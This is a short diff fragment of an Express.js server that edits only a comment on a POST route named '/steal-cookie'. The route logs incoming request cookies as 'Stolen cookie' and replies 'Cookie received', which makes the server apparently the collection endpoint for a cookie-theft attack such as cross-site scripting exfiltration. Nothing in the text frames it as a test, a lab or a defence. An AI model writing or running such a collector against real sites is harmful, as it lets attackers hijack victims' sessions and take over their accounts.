@@ -13,7 +13,7 @@ app.use((req, res, next) => {
 });
 
 app.post('/steal-cookie', (req, res) => {
-  console.log('Stolen cookie:', req.cookies); // 탈취한 쿠키 출력
+  console.log('Stolen cookie:', req.cookies); 
   res.send('Cookie received');
 });
 
